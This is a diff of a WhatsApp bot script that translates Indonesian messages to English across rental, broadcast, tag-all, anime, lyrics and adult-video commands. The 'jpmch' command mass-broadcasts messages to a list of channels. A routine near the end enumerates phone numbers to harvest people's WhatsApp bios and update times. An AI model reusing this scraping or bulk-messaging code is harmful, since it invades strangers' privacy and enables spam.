-    let teks = `⬣ *CEK SEWA GRUP*\n\n`;
+    let teks = `⬣ *GROUP RENTAL STATUS*\n\n`;
     let isFound = false;
 
     for (let x of sewa) {
@@ -14902,13 +14693,13 @@ case 'ceksewa': {
 
             let groupMeta = await hydro.groupMetadata(x.id);
 
-            teks += `🏷️ Nama : *${groupMeta.subject}*\n` +
-                    `🆔 ID   : *${x.id}*\n` +
-                    `⏳ Expired : *${expiredText}*\n`;
+            teks += `🏷️ Name   : *${groupMeta.subject}*\n` +
+                    `🆔 ID     : *${x.id}*\n` +
+                    `⏳ Expiry : *${expiredText}*\n`;
         }
     }
 
-    if (!isFound) return replyhydro("❌ Grup ini belum menyewa bot.");
+    if (!isFound) return replyhydro("❌ This group does not have an active rental.");
     replyhydro(teks);
 }
 break;
@@ -14919,12 +14710,12 @@ case 'extendsewa': {
 
         if (!text || text.split(' ').length < 2) {
             return replyhydro(
-                `Gunakan dengan cara:\n` +
-                `${prefix + command} *Link/IDGrup waktu*\n\n` +
-                `Contoh:\n${prefix + command} https://chat.whatsapp.com/XXX 30d\n` +
+                `Usage:\n` +
+                `${prefix + command} *groupLink/groupID duration*\n\n` +
+                `Example:\n${prefix + command} https://chat.whatsapp.com/XXX 30d\n` +
                 `${prefix + command} 1203630XXXXX@g.us 30d\n\n` +
-                `*CATATAN:*\n` +
-                `d = hari, h = jam, m = menit, s = detik, y = tahun`
+                `*NOTES:*\n` +
+                `d = days, h = hours, m = minutes, s = seconds, y = years`
             );
         }
 
@@ -14939,18 +14730,18 @@ case 'extendsewa': {
         }
 
         if (!checkSewaGroup(targetId, sewa)) {
-            return replyhydro("❌ Grup tidak ditemukan di database sewa!\nSilakan gunakan *addsewa* terlebih dahulu.");
+            return replyhydro("❌ Group not found in rental database!\nPlease use *addsewa* first.");
         }
 
         let position = getSewaPosition(targetId, sewa);
 
         if (sewa[position].expired === 'PERMANENT') {
-            return replyhydro("⚠️ Grup ini sudah memiliki status sewa PERMANENT, tidak perlu ditambah.");
+            return replyhydro("⚠️ This group already has PERMANENT rental status.");
         }
 
         let tambahanWaktu = toMs(waktu);
         if (!tambahanWaktu) {
-            return replyhydro("❌ Format waktu tidak valid!");
+            return replyhydro("❌ Invalid time format!");
         }
 
         let sekarang = Date.now();
@@ -14967,11 +14758,11 @@ case 'extendsewa': {
         let groupName = groupMeta ? groupMeta.subject : "Unknown Group";
 
         replyhydro(
-            `✅ Berhasil memperpanjang sewa!\n\n` +
-            `🏷️ Nama : *${groupName}*\n` +
-            `🆔 ID   : *${targetId}*\n` +
-            `⏳ Tambahan : *${waktu}*\n` +
-            `⏰ Expired Baru : *${expiredText}*`
+            `✅ Rental extended successfully!\n\n` +
+            `🏷️ Name     : *${groupName}*\n` +
+            `🆔 ID       : *${targetId}*\n` +
+            `⏳ Added    : *${waktu}*\n` +
+            `⏰ New Expiry: *${expiredText}*`
         );
 
     } catch (err) {
@@ -14982,7 +14773,7 @@ case 'extendsewa': {
 break;
 // ==========================================================
 case "jpmch": {
-  if (!isHyd && !isHydro && !Ahmad) return replytolak("⚠️ Hanya dapat diakses oleh Pengguna *Jasher Hydro*!");
+  if (!isHyd && !isHydro && !Ahmad) return replytolak("⚠️ Access restricted to *Jasher Hydro Users* only!");
 
   global.jpmCooldown = global.jpmCooldown || {};
   let now = Date.now();
@@ -14995,23 +14786,23 @@ case "jpmch": {
   if (!Ahmad) {
     if (global.jpmCooldown[m.sender] && (now - global.jpmCooldown[m.sender]) < cooldown) {
       let sisa = cooldown - (now - global.jpmCooldown[m.sender]);
-      let menit = Math.floor(sisa / 60000);
-      let detik = Math.floor((sisa % 60000) / 1000);
-      return replytolak(`⏳ Fitur ini hanya bisa digunakan lagi dalam ${menit} menit ${detik} detik!`);
+      let minutes = Math.floor(sisa / 60000);
+      let seconds = Math.floor((sisa % 60000) / 1000);
+      return replytolak(`⏳ You can use this feature again in ${minutes} minutes ${seconds} seconds.`);
     }
     global.jpmCooldown[m.sender] = now;
   }
 
-  if (!text) return replytolak("⚠️ Format Salah!\n\n📌 Contoh penggunaan:\n- `jpmch Halo semua!`\n- Balas gambar dengan caption: `jpmch Halo semua!`");
+  if (!text) return replytolak("⚠️ Invalid format!\n\n📌 Example:\n- `jpmch Hello everyone!`\n- Reply to an image with caption: `jpmch Hello everyone!`");
 
   const filePath = './database/listid.json';
-  if (!fs.existsSync(filePath)) return replytolak("⚠️ Tidak ada daftar saluran!");
+  if (!fs.existsSync(filePath)) return replytolak("⚠️ No channel list found!");
   const daftarSaluran = JSON.parse(fs.readFileSync(filePath));
 
-  if (!daftarSaluran.length) return replytolak("⚠️ Tidak ada saluran yang terdaftar!");
+  if (!daftarSaluran.length) return replytolak("⚠️ No registered channels!");
 
   let total = 0;
-  replyhydro(`🚀 Mengirim pesan ke ${daftarSaluran.length} saluran...\n\n⏳ Pesan akan dikirim dengan jeda 5 detik per channel.`);
+  replyhydro(`🚀 Sending message to *${daftarSaluran.length}* channels...\n\n⏳ Delay: 5 seconds per channel.`);
 
   let mediaPath = null;
   try {
@@ -15019,7 +14810,7 @@ case "jpmch": {
       mediaPath = await hydro.downloadAndSaveMediaMessage(qmsg);
     }
   } catch (e) {
-    console.error("Gagal download media:", e);
+    console.error("Media download failed:", e);
   }
 
   for (const idSaluran of daftarSaluran) {
@@ -15039,24 +14830,24 @@ case "jpmch": {
       total++;
       await sleep(5000);
     } catch (err) {
-      console.error(`❌ Gagal mengirim ke saluran ${idSaluran}:`, err);
+      console.error(`❌ Failed to send to channel ${idSaluran}:`, err);
     }
   }
 
   if (mediaPath) fs.unlinkSync(mediaPath);
 
-  replyhydro(`✅ Selesai!\n\n✔️ Berhasil: ${total}\n❌ Gagal: ${daftarSaluran.length - total}\n\n💼 *Powered by ${botname}*`);
+  replyhydro(`✅ Completed!\n\n✔️ Success: ${total}\n❌ Failed: ${daftarSaluran.length - total}\n\n💼 *Powered by ${botname}*`);
 }
 break;
 case 'totalchat':
 case 'totalpessn': {
     if (!m.isGroup) return replytolak(mess.only.group)
     if (!isAdmins && !Ahmad) return reply(global.mess.only.admin)
-    if (!global.db.chats[m.chat]?.totalChat) return replyhydro('📊 *ᴄʜᴀᴛ sᴛᴀᴛɪsᴛɪᴄs*\n\n> Belum ada data chat tercatat.');
+    if (!global.db.chats[m.chat]?.totalChat) return replyhydro('📊 *ᴄʜᴀᴛ sᴛᴀᴛɪsᴛɪᴄs*\n\n> No chat data recorded yet.');
 
     if (text && text == 'reset') {
         global.db.chats[m.chat].totalChat = {}
-        return replyhydro("✅ *Total chat telah di reset untuk grup ini.*");
+        return replyhydro("✅ *Chat statistics have been reset for this group.*");
     }
 
     const entries = Object.entries(global.db.chats[m.chat].totalChat)
@@ -15065,7 +14856,7 @@ case 'totalpessn': {
         .sort((a, b) => b.count - a.count)
         .slice(0, 15);
 
-    if (entries.length === 0) return m.reply('📊 *ᴄʜᴀᴛ sᴛᴀᴛɪsᴛɪᴄs*\n\n> Data masih kosong.');
+    if (entries.length === 0) return m.reply('📊 *ᴄʜᴀᴛ sᴛᴀᴛɪsᴛɪᴄs*\n\n> No data available.');
 
     let teks = `📊 *ᴛᴏᴘ ᴄʜᴀᴛᴛᴇʀs*\n\n`
     const medals = ['🥇', '🥈', '🥉']
@@ -15078,14 +14869,14 @@ case 'totalpessn': {
         mentions.push(jid)
         
         teks += `${medal} @${name}\n`
-        teks += `    💬 *${count.toLocaleString('id-ID')}* pesan\n`
+        teks += `    💬 *${count.toLocaleString('en-US')}* messages\n`
     }
 
     const totalMessages = entries.reduce((sum, el) => sum + el.count, 0)
     
     teks += `\n╭┈┈⬡「 📈 *ᴛᴏᴛᴀʟ* 」\n`
-    teks += `┃ 👥 Member aktif: *${entries.length}*\n`
-    teks += `┃ 💬 Total pesan: *${totalMessages.toLocaleString('id-ID')}*\n`
+    teks += `┃ 👥 Active members: *${entries.length}*\n`
+    teks += `┃ 💬 Total messages: *${totalMessages.toLocaleString('en-US')}*\n`
     teks += `╰┈┈┈┈┈┈┈┈⬡`
 
     hydro.sendMessage(m.chat, { text: teks, mentions }, { quoted: m })
@@ -15114,7 +14905,7 @@ ntlinkch.splice(off, 1)
 fs.writeFileSync('./database/antilinkch.json', JSON.stringify(ntlinkch))
 replyhydro('Success in turning off antich in this group')
 } else {
-replyhydro(`Contoh: ${prefix + command} on/off`)
+replyhydro(`Example: ${prefix + command} on/off`)
  }
  }
  break
@@ -15352,8 +15143,8 @@ await replyhydro(`*[ Done ]*`)
 
             case 'delete': case 'del': {
     if (!isAdmins && !Ahmad) return reply(mess.only.admin)
-    if (!m.quoted) return reply('Reply pesan yang ingin dihapus')
-    
+    if (!m.quoted) return reply('Reply to the message you want to delete.')
+
     hydro.sendMessage(m.chat, { 
         delete: { 
             remoteJid: m.chat, 
@@ -15525,20 +15316,22 @@ await hydro.groupParticipantsUpdate(m.chat, [users], 'remove')
 await replyhydro(`*[ Done ]*`)
 }
 break
-case 'setbotname':{
-if (!Ahmad) return replytolak(mess.only.owner)
-if (!text) return replyhydro(`Dimana namanya?\nContoh: ${prefix + command} ${botname}`)
+case 'setbotname': {
+    if (!Ahmad) return replytolak(mess.only.owner)
+    if (!text) return replyhydro(`Where is the name?\nExample: ${prefix + command} ${botname}`)
+
     await hydro.updateProfileName(text)
-    replyhydro(`Success in changing the name of bot's number`)
-    }
-    break
-case 'setbotbio':{
-if (!Ahmad) return replytolak(mess.only.owner)
-if (!text) return replyhydro(`Dimana teksnya?\nContoh: ${prefix + command} ${botname}`)
+    replyhydro(`✅ Bot name has been successfully updated.`)
+}
+break
+case 'setbotbio': {
+    if (!Ahmad) return replytolak(mess.only.owner)
+    if (!text) return replyhydro(`Where is the text?\nExample: ${prefix + command} ${botname}`)
+
     await hydro.updateProfileStatus(text)
-    replyhydro(`Success in changing the bio of bot's number`)
-    }
-    break
+    replyhydro(`✅ Bot bio has been successfully updated.`)
+}
+break
    case 'setnamegc': case 'setgroupname': case 'setsubject': {
 if (!m.isGroup) return replytolak(mess.only.group)
 if (!isBotAdmins) return replytolak(mess.only.badmin)
@@ -15721,15 +15514,23 @@ case 'tagall': {
 if (!m.isGroup) return replytolak(mess.only.group)
 if (!isAdmins && !Ahmad) return reply(mess.only.admin)
 if (!isBotAdmins) return replytolak(mess.only.badmin)
-me = m.sender
+
+let me = m.sender
+
 let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
  
- 😶 *penanda :*  @${me.split('@')[0]}
- 🌿 *Isi pesan : ${q ? q : 'tidak ada pesan'}*\n\n`
+👤 *Sender:* @${me.split('@')[0]}
+💬 *Message:* ${q ? q : 'No message'}\n\n`
+
 for (let mem of participants) {
-teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
+    teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
 }
-hydro.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+
+hydro.sendMessage(
+    m.chat,
+    { text: teks, mentions: participants.map(a => a.id) },
+    { quoted: m }
+)
 }
 break
 case 'ebinary': {
@@ -15758,10 +15559,13 @@ case 'jadianime': {
     const cost = 5;
 
     if (userLimit.limit < cost) {
-        return replyhydro(`Limit kamu kurang!\nButuh *${cost}* limit.\n> Sisa limit: *${userLimit.limit}*`);
+        return replyhydro(`⚔️ Insufficient limit.
+
+Required: *${cost}*
+Remaining: *${userLimit.limit}*`);
     }
 
-    let defaultPrompt = "Anthropomorphic, Gijinka, personification, turning the main object into a living anime character, the character's body and clothing are formed entirely from the object, solo, standing alone, no humans holding the object, best quality, masterpiece, 2d anime style, highly detailed.";
+    let defaultPrompt = "Masterpiece, best quality, highly detailed 2D anime style, anthropomorphic gijinka, object transformed into a human-like character, body and clothing entirely based on the object, solo, centered composition, no external interaction, clean background, sharp details.";
     let promptText = text ? `${defaultPrompt}, ${text}` : defaultPrompt;
 
     await hydro.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
@@ -16440,7 +16244,7 @@ async function Screenshot(url) {
         throw Error(err.message);
     }
 }
-    if (!args[0]) return m.reply('Berikan Url Web Nya\n\n*Example :* .ssweb https://www.nasa.gov ');
+    if (!args[0]) return m.reply('⚔️ No URL provided.\n\nExample: .ssweb https://www.nasa.gov');
 
     try {
         let result = await Screenshot(args[0]);
@@ -16482,7 +16286,12 @@ case 'anime': {
     const malScraper = require('mal-scraper');
 
     if (!args.length) {
-        return replyhydro(`Gunakan format:\n- *${prefix}anime <judul>*\n- *${prefix}anime search <judul>*\n- *${prefix}anime jadwal*\n- *${prefix}anime detail <slug>*\n- *${prefix}anime download <slug>*`);
+        return replyhydro(`Usage:
+- *${prefix}anime <title>*
+- *${prefix}anime search <title>*
+- *${prefix}anime schedule*
+- *${prefix}anime detail <slug>*
+- *${prefix}anime download <slug>*`);
     }
 
     const subCommand = args[0].toLowerCase();
@@ -35451,9 +35260,9 @@ async function jadwalSholat(kota) {
         forwardingScore: 2025,
         isForwarded: true,
         forwardedNewsletterMessageInfo: {
-          newsletterJid: '120363323868732166@newsletter',
-          serverMessageId: null,
-          newsletterName: "hydroID-V5",
+          newsletterJid: '120363406397452589@newsletter',
+serverMessageId: null,
+newsletterName: "Aizen",
         },
         externalAdReply: {
           title: `Jadwal Sholat Harian`,
@@ -36868,7 +36677,7 @@ isForwarded: true,
             let jodoh = member[Math.floor(Math.random() * member.length)]
 hydro.sendMessage(m.chat,
 { text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
-Cieeee, What's Going On❤️💖👀`,
+Cieeee, What is Going On❤️💖👀`,
 contextInfo:{
 mentionedJid:[orang, jodoh],
 forwardingScore: 9999999,
@@ -37245,10 +37054,10 @@ case 'lyrics': {
 
         const caption = `┌──「 *Lirik Ditemukan* 」
 │
-│ ◦ *Judul* : ${trackName}
-│ ◦ *Artis* : ${artistName}
+│ ◦ *Title* : ${trackName}
+│ ◦ *Artist* : ${artistName}
 │ ◦ *Album* : ${albumName}
-│ ◦ *Durasi* : ${formatDuration}
+│ ◦ *Durasion* : ${formatDuration}
 │
 └─────────────────
 
@@ -37301,7 +37110,7 @@ case 'xnxxdl': {
             console.log(xn)
 hydro.sendMessage(m.chat, { caption: `≡  *XNXX DL*
         
-▢ *📌 Judul*: ${xn.title}
+▢ *📌 Title*: ${xn.title}
 ▢ *🗂️ Size*: ${xn.size}
 ▢ *⌚Duration* ${xn.ruration}
 ▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: m })
@@ -37663,7 +37472,7 @@ var anu1 = '401'
 if (anu1 == '401' || anu1.status.length == 0) {
 nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
 } else {
-text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
+text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Africa/accra').format('HH:mm:ss DD/MM/YYYY')}\n\n`
 }
             } catch {
 nowhatsapp += `${number0}${i}${number1}\n`
